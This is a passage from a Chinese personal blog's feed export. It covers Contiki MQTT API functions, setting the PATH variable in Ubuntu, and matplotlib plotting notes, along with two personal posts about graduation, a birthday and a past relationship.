<h5 id="MQTT-订阅主题"><a href="#MQTT-订阅主题" class="headerlink" title="MQTT 订阅主题"></a>MQTT 订阅主题</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 订阅一个MQTT主题.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param mid 指向message ID的指针.</div><div class="line">* \param topic 指向要订阅的主题的指针.</div><div class="line">* \param qos_level 服务质量等级.</div><div class="line">* \return MQTT_STATUS_OK or some error status</div><div class="line">*/</div><div class="line"><span class="keyword">mqtt_status_t</span> mqtt_subscribe(struct mqtt_connection *conn,</div><div class="line">                                <span class="keyword">uint16_t</span> *mid,</div><div class="line">                                <span class="keyword">char</span> *topic,</div><div class="line">                                <span class="keyword">mqtt_qos_level_t</span> qos_level);</div></pre></td></tr></table></figure>
<h5 id="MQTT-取消订阅"><a href="#MQTT-取消订阅" class="headerlink" title="MQTT 取消订阅"></a>MQTT 取消订阅</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 取消订阅的主题.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param mid 指向message ID的指针.</div><div class="line">* \param topic 指向要取消订阅的主题的指针.</div><div class="line">* \return MQTT_STATUS_OK or some error status</div><div class="line">*/</div><div class="line"><span class="keyword">mqtt_status_t</span> mqtt_unsubscribe(struct mqtt_connection *conn,</div><div class="line">                                <span class="keyword">uint16_t</span> *mid,</div><div class="line">                                <span class="keyword">char</span> *topic);</div></pre></td></tr></table></figure>
<h5 id="MQTT-发布消息"><a href="#MQTT-发布消息" class="headerlink" title="MQTT 发布消息"></a>MQTT 发布消息</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 发布消息到一个MQTT主题.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param mid 指向message ID的指针.</div><div class="line">* \param topic 指向要发布消息的主题的指针.</div><div class="line">* \param payload 指向主题有效载荷的指针.</div><div class="line">* \param payload_size 有效载荷大小.</div><div class="line">* \param qos_level 服务质量等级.</div><div class="line">* \param retain 保持标志，如果RETAIN标志设置为1，则表示服务器要保留这次推送的信息，如果有新的订阅者出现，就把这消息推送给它.</div><div class="line">* \return MQTT_STATUS_OK or some error status</div><div class="line">*/</div><div class="line"><span class="keyword">mqtt_status_t</span> mqtt_publish(struct mqtt_connection *conn,</div><div class="line">                            <span class="keyword">uint16_t</span> *mid,</div><div class="line">                            <span class="keyword">char</span> *topic,</div><div class="line">                            <span class="keyword">uint8_t</span> *payload,</div><div class="line">                            <span class="keyword">uint32_t</span> payload_size,</div><div class="line">                            <span class="keyword">mqtt_qos_level_t</span> qos_level,</div><div class="line">                            <span class="keyword">mqtt_retain_t</span> retain);</div></pre></td></tr></table></figure>
<h5 id="MQTT-用户名密码"><a href="#MQTT-用户名密码" class="headerlink" title="MQTT 用户名密码"></a>MQTT 用户名密码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 设置MQTT客户端的用户名和密码.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param username 指向用户名的指针.</div><div class="line">* \param password 指向密码的指针.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mqtt_set_username_password</span><span class="params">(struct mqtt_connection *conn,</span></span></div><div class="line">                                <span class="keyword">char</span> *username,</div><div class="line">                                <span class="keyword">char</span> *password);</div></pre></td></tr></table></figure>
<h5 id="MQTT-遗言"><a href="#MQTT-遗言" class="headerlink" title="MQTT 遗言"></a>MQTT 遗言</h5><p>　　遗言就是一个由客户端预先定义好的主题和对应消息，附加在 CONNECT 的可变头部中，在客户端连接出现异常的情况下，由服务器主动发布此消息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 为MQTT客户端设置遗言主题和消息</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param topic 指向遗言主题的指针.</div><div class="line">* \param message 指向遗言消息的指针.</div><div class="line">* \param qos 服务质量等级.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mqtt_set_last_will</span><span class="params">(struct mqtt_connection *conn,</span></span></div><div class="line">                        <span class="keyword">char</span> *topic,</div><div class="line">                        <span class="keyword">char</span> *message,</div><div class="line">                        <span class="keyword">mqtt_qos_level_t</span> qos);</div></pre></td></tr></table></figure>
<h5 id="MQTT-状态检测"><a href="#MQTT-状态检测" class="headerlink" title="MQTT 状态检测"></a>MQTT 状态检测</h5><p>　　可以使用以下帮助函数来声明 MQTT 连接状态，以检查节点是否连接到代理，如果连接已建立并且缓冲区中有空间可以发布，则使用 mqtt_ready。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> mqtt_connected(conn) \</span></div><div class="line">((conn)-&gt;state == MQTT_CONN_STATE_CONNECTED_TO_BROKER ? 1 : 0)</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> mqtt_ready(conn) \</span></div><div class="line">(!(conn)-&gt;out_queue_full &amp;&amp; mqtt_connected((conn)))</div></pre></td></tr></table></figure>
<p>　　参考文献：<a href="https://github.com/marcozennaro/IPv6-WSN-book" target="_blank" rel="external">IPv6-WSN-book：https://github.com/marcozennaro/IPv6-WSN-book</a></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>Contiki</tag>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 下修改环境变量的三种方法</title>
    <url>/2017/06/22/Ubuntu%20%E4%B8%8B%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>　　Ubuntu 下设置环境变量有三种方法，一种用于当前终端，一种用于当前用户，一种用于所有用户。</p>
<a id="more"></a>
<h4 id="用于当前终端"><a href="#用于当前终端" class="headerlink" title="用于当前终端"></a>用于当前终端</h4><p>　　在当前终端中输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">export PATH=$PATH:&lt;你的要加入的路径&gt;</div></pre></td></tr></table></figure>
<p>　　不过上面的方法只适用于当前终端，一旦当前终端关闭或在另一个终端中，则无效。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">export NDK_ROOT=/home/jiang/soft/Android-ndk-r8e</div></pre></td></tr></table></figure>
<p>　　这样只能在当前终端使用。</p>
<h4 id="用于当前用户"><a href="#用于当前用户" class="headerlink" title="用于当前用户"></a>用于当前用户</h4><p>　　在用户主目录下有一个 .bashrc 隐藏文件，可以在此文件中加入 PATH 的设置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ vi ~/.bashrc</div></pre></td></tr></table></figure>
<p>　　加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">export PATH=&lt;你的要加入的路径&gt;:$PATH</div></pre></td></tr></table></figure>
<p>　　例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">export PATH=/home/jiang/soft/Android-ndk-r8e:$PATH</div></pre></td></tr></table></figure>
<p>　　如果要加入多个路径，只要：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">export PATH=&lt;你要加入的路径1&gt;:&lt;你要加入的路径2&gt;: ...... :$PATH</div></pre></td></tr></table></figure>
<p>　　当中每个路径要以冒号分隔。这样每次登录都会生效</p>
<h4 id="用于所有用户"><a href="#用于所有用户" class="headerlink" title="用于所有用户"></a>用于所有用户</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo vi /etc/profile</div></pre></td></tr></table></figure>
<p>　　加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">export PATH=&lt;你要加入的路径&gt;:$PATH</div></pre></td></tr></table></figure>
<p>　　终端输入：<code>echo $PATH</code> 可以查看环境变量</p>
<p>　　<strong>注意，修改环境变量后，除了第一种方法立即生效外，第二第三种方法要立即生效，可以source ~/.bashrc或者注销再次登录后就可以了！</strong></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Python matplotlib 学习笔记</title>
    <url>/2017/06/18/Python%20matplotlib%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>　　Python 数据分析与展示课程之 Matplotlib 绘图库学习。</p>
<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>　　Matplotlib 是一个 Python 的 2D 绘图库，它以各种硬拷贝格式和跨平台的交互式环境生成出版质量级别的图形。它能让使用者很轻松地将数据图形化，并且提供多样化的输出格式。</p>
<h5 id="pyplot"><a href="#pyplot" class="headerlink" title="pyplot"></a>pyplot</h5><p>　　matplotlib.pyplot 是绘制各类可视化图形的命令子库，它是是命令行式函数的集合，相当于快捷方式，每一个函数都对图像作了修改，比如创建图形，在图像上创建画图区域，在画图区域上画线，在线上标注等。</p>
<p>　　安装 matplot 之前先要安装 Numpy，Numpy 也是 python 的一个扩展包，提供基础的科学计算。</p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python -m pip install -U pip setuptools</span></div><div class="line"><span class="meta">$</span><span class="bash"> python -m pip install matplotlib</span></div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>　　使用 matplotlib 绘制了 x 平方在区间 [-6，6] 的图像：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"></div><div class="line">x = np.arange(<span class="number">-6</span>,<span class="number">7</span>,<span class="number">1</span>)</div><div class="line">y = x**<span class="number">2</span></div><div class="line"></div><div class="line">plt.plot(x,y,<span class="string">'b--'</span>)</div><div class="line"></div><div class="line">plt.show()</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/18-1.png" alt="18-1"></p>
<h4 id="plot函数"><a href="#plot函数" class="headerlink" title="plot函数"></a>plot函数</h4><h5 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h5><p>　　plt.plot(x, y, format_string, **kwargs)</p>
<p>　　参数说明：</p>
<ul>
<li><p>x ： X轴数据，列表或数组，可选</p>
</li>
<li><p>y ： Y轴数据，列表或数组</p>
</li>
<li><p>format_string ： 控制曲线的格式字符串，可选</p>
</li>
<li><p>**kwargs ：第二组或更多(x,y,format_string)</p>
</li>
</ul>
<p>　　plt.plot() 只有一个输入列表或数组时，参数被当作Y轴，X轴以索引自动生成</p>
<p>　　plt.plot(x,y) 当有两个以上参数时，按照X轴和Y轴顺序绘制数据点</p>
<p>　　<strong>注意：当绘制多条曲线时，各条曲线的x不能省略</strong></p>
<h5 id="format-string"><a href="#format-string" class="headerlink" title="format_string"></a>format_string</h5><p>　　format_string：由颜色字符、风格字符和标记字符组成</p>
<ul>
<li>颜色设置</li>
</ul>
<p>　　plot 方法的关键字参数 color(或c) 用来设置线的颜色。</p>
<table>
<thead>
<tr>
<th style="text-align:center">颜色字符</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">颜色字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">‘b’</td>
<td style="text-align:center">blue 蓝色</td>
<td style="text-align:center">‘y’</td>
<td style="text-align:center">yellow 黄色</td>
</tr>
<tr>
<td style="text-align:center">‘g’</td>
<td style="text-align:center">green 绿色</td>
<td style="text-align:center">‘k’</td>
<td style="text-align:center">black 黑色</td>
</tr>
<tr>
<td style="text-align:center">‘r’</td>
<td style="text-align:center">red 红色</td>
<td style="text-align:center">‘w’</td>
<td style="text-align:center">white 白色</td>
</tr>
<tr>
<td style="text-align:center">‘c’</td>
<td style="text-align:center">cyan 青绿色</td>
<td style="text-align:center">‘#rrggbb’</td>
<td style="text-align:center">RGB颜色</td>
</tr>
<tr>
<td style="text-align:center">‘m’</td>
<td style="text-align:center">magenta 洋红色</td>
<td style="text-align:center">‘0.8’</td>
<td style="text-align:center">灰度值</td>
</tr>
</tbody>
</table>
<p>　　其中，</p>
<p>　　<strong>RGB 颜色字符串：</strong>(r, g, b) 或 (r, g, b, a)，其中 r g b a 取均为[0, 1]之间</p>
<p>　　<strong>灰度值字符串：</strong>[0, 1]之间的浮点数的字符串形式，表示灰度值。0表示黑色，1表示白色</p>
<ul>
<li>样式设置</li>
</ul>
<p>　　plot 方法的关键字参数 linestyle(或ls) 用来设置线条的样式。</p>
<table>
<thead>
<tr>
<th style="text-align:center">样式字符</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">样式字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">‘-‘</td>
<td style="text-align:center">实线风格</td>
<td style="text-align:center">‘–’</td>
<td style="text-align:center">虚线风格</td>
</tr>
<tr>
<td style="text-align:center">‘-.’</td>
<td style="text-align:center">点划线风格</td>
<td style="text-align:center">‘:’</td>
<td style="text-align:center">虚线风格</td>
</tr>
<tr>
<td style="text-align:center">‘’ ‘ ‘</td>
<td style="text-align:center">无线条</td>
</tr>
</tbody>
</table>
<ul>
<li>标记设置</li>
</ul>
<p>　　plot 方法的关键字参数 marker 用来设置标记风格。</p>
<table>
<thead>
<tr>
<th style="text-align:center">标记字符</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">标记字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">‘.’</td>
<td style="text-align:center">点标记</td>
<td style="text-align:center">‘,’</td>
<td style="text-align:center">像素标记</td>
</tr>
<tr>
<td style="text-align:center">‘o’</td>
<td style="text-align:center">圆圈标记</td>
<td style="text-align:center">‘v’</td>
<td style="text-align:center">下三角标记</td>
</tr>
<tr>
<td style="text-align:center">‘^’</td>
<td style="text-align:center">上三角标记</td>
<td style="text-align:center">‘&lt;’</td>
<td style="text-align:center">左三角标记</td>
</tr>
<tr>
<td style="text-align:center">‘&gt;’</td>
<td style="text-align:center">右三角标记</td>
<td style="text-align:center">‘1’</td>
<td style="text-align:center">下花三角标记</td>
</tr>
<tr>
<td style="text-align:center">‘2’</td>
<td style="text-align:center">上花三角标记</td>
<td style="text-align:center">‘3’</td>
<td style="text-align:center">左花三角标记</td>
</tr>
<tr>
<td style="text-align:center">‘4’</td>
<td style="text-align:center">右花三角标记</td>
<td style="text-align:center">‘s’</td>
<td style="text-align:center">正方形标记</td>
</tr>
<tr>
<td style="text-align:center">‘p’</td>
<td style="text-align:center">五边形标记</td>
<td style="text-align:center">‘*’</td>
<td style="text-align:center">星标记</td>
</tr>
<tr>
<td style="text-align:center">‘h’</td>
<td style="text-align:center">六边形1标记</td>
<td style="text-align:center">‘H’</td>
<td style="text-align:center">六边形2标记</td>
</tr>
<tr>
<td style="text-align:center">‘+’</td>
<td style="text-align:center">十字标记</td>
<td style="text-align:center">‘x’</td>
<td style="text-align:center">x标记</td>
</tr>
<tr>
<td style="text-align:center">‘D’</td>
<td style="text-align:center">菱形标记</td>
<td style="text-align:center">‘d’</td>
<td style="text-align:center">瘦菱形标记</td>
</tr>
<tr>
<td style="text-align:center">‘</td>
<td style="text-align:center">‘</td>
<td style="text-align:center">垂直线标记</td>
<td style="text-align:center">‘_’</td>
<td>_标记</td>
</tr>
</tbody>
</table>
<p>　　markersize(ms) 设置标记大小</p>
<p>　　markerfacecolor(mfc) 设置标记颜色</p>
<p>　　markeredgecolor(mec) 设置标记边缘的颜色</p>
<p>　　markeredgewidth(mew) 设置标记边缘的宽度</p>
<p>　　更多属性设置请参考 matplotlib 的官方文档。</p>
<p>　　<strong>可以通过格式化参数指定线条的颜色和样式：</strong></p>
<p>　　例如：’b–*’表示蓝色，虚线，用星号标记点</p>
<ul>
<li>线条宽度</li>
</ul>
<p>　　设置 plot 方法的关键字参数 linewidth(或lw) 可以改变线条的粗细，其值为浮点数。</p>
<ul>
<li>线条标签</li>
</ul>
<p>　　label : 给所绘制的曲线一个名字</p>
<p>　　label标签指定的名字在图示(legend)中显示，需在 plt.show() 之前调用 plt.legend()。在字符串前后添加 “$” 符号，matplotlib 会使用其内嵌的 latex 引擎绘制的数学公式。</p>
<p>　　图示默认绘制于图的右下角，legend 方法可接受一个 loc 关键字参数来设定图例的位置，可取值为数字或字符串：</p>
<table>
<thead>
<tr>
<th style="text-align:right">数字</th>
<th style="text-align:center">字符串</th>
<th style="text-align:center">说明</th>
<th style="text-align:left">数字</th>
<th>字符串</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">0</td>
<td style="text-align:center">‘best’</td>
<td style="text-align:center">默认</td>
<td style="text-align:left">1</td>
<td>‘upper right’</td>
<td>右上角</td>
</tr>
<tr>
<td style="text-align:right">2</td>
<td style="text-align:center">‘upper left’</td>
<td style="text-align:center">左上角</td>
<td style="text-align:left">3</td>
<td>‘lower left’</td>
<td>左下角</td>
</tr>
<tr>
<td style="text-align:right">4</td>
<td style="text-align:center">‘lower right’</td>
<td style="text-align:center">右下角</td>
<td style="text-align:left">5</td>
<td>‘right’</td>
<td>右侧</td>
</tr>
<tr>
<td style="text-align:right">6</td>
<td style="text-align:center">‘center left’</td>
<td style="text-align:center">左侧居中</td>
<td style="text-align:left">7</td>
<td>‘center right’</td>
<td>右侧居中</td>
</tr>
<tr>
<td style="text-align:right">8</td>
<td style="text-align:center">‘lower center’</td>
<td style="text-align:center">底部居中</td>
<td style="text-align:left">9</td>
<td>‘upper center’</td>
<td>上方居中</td>
</tr>
<tr>
<td style="text-align:right">10</td>
<td style="text-align:center">‘center’</td>
<td style="text-align:center">正中间</td>
</tr>
</tbody>
</table>
<ul>
<li>示例程序</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"></div><div class="line">x = np.arange(<span class="number">-6</span>,<span class="number">7</span>,<span class="number">1</span>)</div><div class="line">y = x**<span class="number">1</span></div><div class="line">z = x**<span class="number">2</span></div><div class="line"></div><div class="line">plt.title(<span class="string">'x and x square'</span>)</div><div class="line">plt.plot(x,y,<span class="string">'b--'</span>,marker=<span class="string">'+'</span>,label=<span class="string">"$x^2$"</span>)    <span class="comment">#`b-`是`color="blue",linestyle="-"`的简写形式</span></div><div class="line">plt.plot(x,z,color=<span class="string">'r'</span>,linestyle=<span class="string">'--'</span>,marker=<span class="string">'*'</span>,label=<span class="string">"$x^3$"</span>,linewidth=<span class="number">2</span>)</div><div class="line"></div><div class="line">plt.legend(loc=<span class="number">1</span>)</div><div class="line">plt.show()</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/18-2.png" alt="18-2"></p>
<h4 id="绘图区域设置"><a href="#绘图区域设置" class="headerlink" title="绘图区域设置"></a>绘图区域设置</h4><h5 id="绘图区域的概念"><a href="#绘图区域的概念" class="headerlink" title="绘图区域的概念"></a>绘图区域的概念</h5><p>　　在 matplotlib 中，整个图像为一个 Figure 对象。在 Figure 对象中可以包含一个，或者多个 Axes 对象。每个 Axes 对象都是一个拥有自己坐标系统的绘图区域。其逻辑关系如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/18-3.png" alt="18-3"></p>
<p>　　一个 Figure 对应一张图片。Title 为标题。Axis 为坐标轴，Label 为坐标轴标注。Tick 为刻度线，Tick Label 为刻度注释。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/18-4.png" alt="18-4"></p>
<h5 id="绘制子图"><a href="#绘制子图" class="headerlink" title="绘制子图"></a>绘制子图</h5><p>　　plt.subplot(nrows, ncols, plot_number)</p>
<p>　　在全局绘图区域中创建一个分区体系，并定位到一个子绘图区域</p>
<p>　　参数说明：</p>
<ul>
<li><p>nrows ： 将整个绘图区域分成几行</p>
</li>
<li><p>ncols ： 将整个绘图区域分成几列</p>
</li>
<li><p>plot_number ： 当前绘制的区域编号</p>
</li>
</ul>
<p>　　例如：</p>
<p>　　plt.subplot(3,2,4)，也可省略逗号 plt.subplot(324)</p>
<h5 id="示例程序1"><a href="#示例程序1" class="headerlink" title="示例程序1"></a>示例程序1</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"></div><div class="line">x = np.arange(<span class="number">-6</span>,<span class="number">7</span>,<span class="number">1</span>)</div><div class="line">y = x**<span class="number">1</span></div><div class="line">z = x**<span class="number">2</span></div><div class="line"></div><div class="line">plt.subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">plt.plot(x,y)</div><div class="line"></div><div class="line">plt.subplot(<span class="number">212</span>)</div><div class="line">plt.plot(x,z,<span class="string">'r--'</span>)</div><div class="line"></div><div class="line">plt.show()</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/18-5.png" alt="18-5"></p>
<h5 id="设置图表标题"><a href="#设置图表标题" class="headerlink" title="设置图表标题"></a>设置图表标题</h5><p>　　plt.title(‘标题字符串’)用于设置图表的标题。</p>
<h5 id="设置坐标轴"><a href="#设置坐标轴" class="headerlink" title="设置坐标轴"></a>设置坐标轴</h5><ul>
<li>轴区间设置</li>
</ul>
<ol>
<li><p>axis方法：axis([xmin,xmax,ymin,ymax])</p>
</li>
<li><p>设置x轴的最大最小区间：xlim((xmin,xmax)) </p>
</li>
<li><p>设置y轴的最大最小区间：ylim((ymin,ymax))</p>
</li>
</ol>
<ul>
<li>轴标签设置</li>
</ul>
<ol>
<li><p>plt.xlabel()方法用于设置x轴的轴标签</p>
</li>
<li><p>plt.ylabel()方法用于设置x轴的轴标签</p>
</li>
</ol>
<h5 id="设置网格线"><a href="#设置网格线" class="headerlink" title="设置网格线"></a>设置网格线</h5><p>　　plt.grid() 函数可以提供是否显示网格的选项，在 plot() 之后加上 grid(True) 即可在坐标上显示网格。</p>
<h5 id="保存图像"><a href="#保存图像" class="headerlink" title="保存图像"></a>保存图像</h5><p>　　plt.savefig() 将输出图形存储为文件，存储位置为当前 Python 脚本所在目录，默认 PNG 格式，可以通过 dpi 修改输出质量。</p>
<h5 id="示例程序2"><a href="#示例程序2" class="headerlink" title="示例程序2"></a>示例程序2</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"></div><div class="line">x = np.arange(<span class="number">-6</span>,<span class="number">7</span>,<span class="number">1</span>)</div><div class="line">y = x</div><div class="line">plt.axis([<span class="number">-6</span>,<span class="number">6</span>,<span class="number">-6</span>,<span class="number">6</span>])  </div><div class="line">plt.xlabel(<span class="string">'x'</span>)</div><div class="line">plt.ylabel(<span class="string">'y'</span>)</div><div class="line">plt.plot(x,y)</div><div class="line">plt.grid(<span class="keyword">True</span>)  <span class="comment">#设置显示网格</span></div><div class="line"></div><div class="line">plt.savefig(<span class="string">'example2'</span>, dpi=<span class="number">600</span>)</div><div class="line">plt.show()</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/18-6.png" alt="18-6"></p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title>Just Twenty Two</title>
    <url>/2017/06/17/Just-Twenty-Two/</url>
    <content><![CDATA[<p>　　纪念22岁生日。（拖延症真是太可怕了，本来上个月应该完成的博客还是被我拖到了现在）。</p>
<a id="more"></a>
<p>　　5月20日，我的22岁生日，然而21日就是毕业设计答辩，答辩前一天生日确实有点尴尬，为了认真完成毕业答辩，于是把生日庆祝推迟了一天。不过，生日这天还是接到了很多祝福。</p>
<p>　　回忆起大学的四个生日，有和大家一起过的，也有默默度过的，或许我本来就是一个不太爱热闹的人，不希望太多人记得我的生日，不希望大家为我庆生，因为我真的是一个喜欢安静的人。另外，我对于有些事情是很懒的，从来不喜欢去记别人的生日，每次别人记得我的生日都会让我感到很惭愧。</p>
<p>　　不过，每次大家给我过生日我还是很感动很开心的，感谢为我庆生的老铁们。这次的生日，感谢一直记得我生日的家人，在群里给我发红包，祝我生日快乐，突然有点想回家了。</p>
<p>　　21日轻松完成答辩，准备晚上出去嗨一顿，3个室友加上领导和钟善良，虽然没有太多的人，但是吃了最好吃的蛋糕，唱了最满意的歌，吃了最喜欢的小龙虾，感觉真的很幸福了。谢谢室友的陪伴，谢谢领导和钟善良的蛋糕，答辩完，好多感触，谢谢你们陪我喝酒。</p>
<p>　　<img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/17-1.jpg" alt="17-1"></p>
<p>　　听到你们喊我部长我就很开心，更何况看到蛋糕上还是大写的Wuli 部长呢，哈哈哈哈哈。很多次说要戒酒，可是总忍不住要和大家一起喝。我就是这样一个人，有人陪我喝酒我就会很开心呀，因为我觉得很多人喝酒之后都会不一样，都会变得特别有意思。嗯，有你们陪我我就很开心了。可是，以后大概也真的很难再聚在一起喝酒了吧！<br>　　<br>　　<img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/17-2.jpg" alt="17-2"></p>
<p>　　以后，天南地北，我们过生日的时候也很难在一起聚了，只是，希望我们都能一直幸福下去，希望以后你们的朋友也像我一样爱你们（哈哈，找不到有钟傻傻的合照了，将就将就吧）。<br>　　<br>　　<img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/17-3.jpg" alt="17-3"></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28068710&auto=1&height=66"></iframe>]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>愿你以后的朋友像我一样爱你</title>
    <url>/2017/06/16/%E6%84%BF%E4%BD%A0%E4%BB%A5%E5%90%8E%E7%9A%84%E6%9C%8B%E5%8F%8B%E5%83%8F%E6%88%91%E4%B8%80%E6%A0%B7%E7%88%B1%E4%BD%A0/</url>
    <content><![CDATA[<p>　　走过的路，见过的人；各有其因，各有其缘。</p>
<a id="more"></a>
<p>　　大学四年，临近毕业，好几次都有人问我，大学有什么遗憾吗？我都是很正经的回答了他们，因为，我真的没有认真思考过这个问题。</p>
<p>　　今天，无意间在手机的记事本中发现一个新浪博客的地址，点进去，原来是某位小姐姐的博客，还是当初我建议她写的。</p>
<p>　　翻了翻目录，发现一篇与我相关的，2016年2月的文章，很遗憾，现在才看到。</p>
<p>　　<img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/16-1.png" alt="16-1"></p>
<p>　　看完之后，有些感动，也突然觉得，大学四年还是有遗憾的。</p>
<p>　　当初，也是觉得感觉对了，所以想去试一试，但是，即使有过一段快乐的时光，也并未如愿。之后，也再没有找到过这样的感觉，不过，以后一定还是会有的。</p>
<p>　　或许这就是青春吧，至少，也曾追求过，不枉大学四年。</p>
<p>　　走过的路，见过的人；各有其因，各有其缘。</p>
<p>　　四年，也有人向我表白被我拒绝，或许，世界就是这样，我们都在做“贱人”，心里都装着一个自己喜欢的人，然后拒绝了喜欢你的人，或许也是缘分不够吧。</p>
<p>　　后来，很认真的思考过很多次，一直想要放弃却一直在挣扎，之后也有断断续续的联系，不过，后来慢慢被时间冲刷，也没有那么多深入的闲聊，慢慢地也就放弃了。如果不是这次看到这篇博客，或许也不曾想起这些事。</p>
<p>　　我的青春有你的脚印，只是我们未曾走远，说是缘分也好，说是遗憾也对，不管后来怎么样了，至少我们曾经一起开心过。嗯，就是这样的。</p>
<p>　　现在想想，其实，我们还是挺不合适的，只是聊得来。不过，还是谢谢你，我的小姐姐，谢谢曾经的陪伴，谢谢曾经的依赖，感谢曾经快乐的时光。愿你走向幸福的未来，愿你以后的朋友像我一样爱你。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=413829644&auto=1&height=66"></iframe>]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>搜歌，听歌，就用 Listen 1</title>
    <url>/2017/06/14/%E6%90%9C%E6%AD%8C%EF%BC%8C%E5%90%AC%E6%AD%8C%EF%BC%8C%E5%B0%B1%E7%94%A8%20Listen%201/</url>
